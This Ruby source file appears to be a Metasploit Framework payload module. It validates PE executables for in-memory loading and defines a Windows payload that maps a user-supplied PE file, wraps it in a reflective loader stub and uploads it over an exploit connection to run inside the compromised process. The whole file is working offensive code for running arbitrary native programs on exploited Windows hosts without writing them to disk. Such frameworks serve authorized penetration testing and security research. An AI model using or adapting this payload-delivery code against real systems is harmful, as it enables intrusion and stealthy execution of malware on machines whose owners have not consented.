# -*- coding: binary -*-


module Msf
  class OptInjectablePE < OptPath
    def initialize(*args, arch:, **kwargs)
      @arch = arch
      super(*args, **kwargs)
    end

    def self.assert_compatible(pe, arch)
      unless (arch == ARCH_X86 && pe.ptr_32?) || (arch == ARCH_X64 && pe.ptr_64?)
        raise Msf::ValidationError, "Selected PE file is not #{arch}"
      end

      # TODO: Add reflective CLR loading support
      unless pe.hdr.opt['DataDirectory'][14].v['Size'] == 0
        raise Msf::ValidationError, 'PE files with CLR are not currently supported'
      end

      unless pe.hdr.opt['DataDirectory'][5].v['Size'] != 0
        raise Msf::ValidationError, 'PE file is missing relocation data'
      end

      unless pe.hdr.opt['DataDirectory'][11].v['Size'] == 0
        raise Msf::ValidationError, 'PE file contains bounded imports'
      end

      unless pe.hdr.opt['DataDirectory'][9].v['Size'] == 0
        tls_offset = pe.rva_to_file_offset(pe.hdr.opt['DataDirectory'][9].v['VirtualAddress'])
        unless tls_offset.to_i == 0
          tls_callback_table_offset = ''
          if arch == ARCH_X86
            tls_callback_table_offset = pe.read(tls_offset + 4, 4)
          else
            tls_callback_table_offset = pe.read(tls_offset + 12, 12)
          end
          unless tls_callback_table_offset.to_i == 0
            unless pe.read(tls_callback_table_offset, 4).to_i == 0
              raise Msf::ValidationError, 'PE file contains TLS callbacks'
            end
          end
        end
      end
    end

    def valid?(value, check_empty: nil)
      return false unless super
      return false unless File.exist?(File.expand_path(value)) # no memory: locations

      begin
        self.class.assert_compatible(Rex::PeParsey::Pe.new_from_file(value, true), @arch)
      rescue Msf::ValidationError
        return false
      end

      true
    end

  end

  ###
  #
  # Reflective PE  module injects a custom native PE file into the exploited process using a reflective PE loader stub
  #
  ###
  module Payload::Windows::PEInject
    def initialize(info = {})
      super
      register_options([
        OptInjectablePE.new('PE', [ true, 'The local path to the PE file to upload' ], arch: arch.first)
      ], self.class)
    end

    #
    # Returns the PE file path
    #
    def pe_path
      datastore['PE']
    end

    #
    # Transmits the reflective PE payload to the remote
    # computer so that it can be loaded into memory.
    #
    def handle_connection(conn, _opts = {})
      data = ''
      begin
        File.open(pe_path, 'rb') do |f|
          data += f.read
        end
      rescue StandardError
        print_error("Failed to load PE: #{$ERROR_INFO}.")
        elog('Failed to load the PE file', error: e)
        return
      end

      print_status('Premapping PE file...')
      pe_map = create_pe_memory_map(data)
      print_status("Mapped PE size #{pe_map[:bytes].length}")
      opts = {}
      opts[:is_dll] = pe_map[:is_dll]
      opts[:exitfunk] = datastore['EXITFUNC']
      p = encapsulate_reflective_stub(pe_map[:bytes], opts)

      print_status("Uploading reflective PE (#{p.length} bytes)...")
      # Send the size of the thing we're transferring
      conn.put([ p.length ].pack('V'))
      # Send the image name + image
      conn.put(p)
      print_status('Upload completed')
    ensure
      conn.close
    end

    def create_pe_memory_map(file)
      pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(file))
      begin
        OptInjectablePE.assert_compatible(pe, arch.first)
      rescue Msf::ValidationError => e
        print_error("PE validation error: #{e.message}")
        raise
      end

      pe_map = {}
      pe_map[:bytes] = ''
      pe_map[:is_dll] = pe._file_header.v['Characteristics'] == (pe._file_header.v['Characteristics'] | 0x2000)
      vprint_status("PE Characteristics: #{'0x%.8x' % pe._file_header.v['Characteristics']}")
      offset = 0
      virtual_offset = pe.image_base
      vprint_status("ImageBase: 0x#{pe.image_base.to_s(16)}")
      vprint_status("SizeOfImage: 0x#{pe._optional_header.v['SizeOfImage'].to_s(16)}")
      vprint_status("#{pe.sections.first.name} VMA: 0x#{(pe.image_base + pe.sections.first.vma).to_s(16)}")
      vprint_status("#{pe.sections.first.name} Offset: 0x#{pe.sections.first.file_offset.to_s(16)}")
      until offset == pe.sections.first.file_offset
        pe_map[:bytes] << file[offset]
        virtual_offset += 1
        offset += 1
      end

      # Map PE sections
      pe.sections.each do |sec|
        pe_map[:bytes] << "\x00" * ((sec.vma + pe.image_base) - virtual_offset)
        virtual_offset = sec.vma + pe.image_base
        pe_map[:bytes] << sec.read(0, sec.raw_size)
        virtual_offset += sec.raw_size
        pe_map[:bytes] << "\x00" * ((sec.vma + pe.image_base + sec.size) - virtual_offset)
        virtual_offset = sec.vma + pe.image_base + sec.size
      end

      pe_map[:bytes] << "\x00" * ((pe.image_base + pe._optional_header.v['SizeOfImage']) - virtual_offset)
      pe_map
    end
  end
end
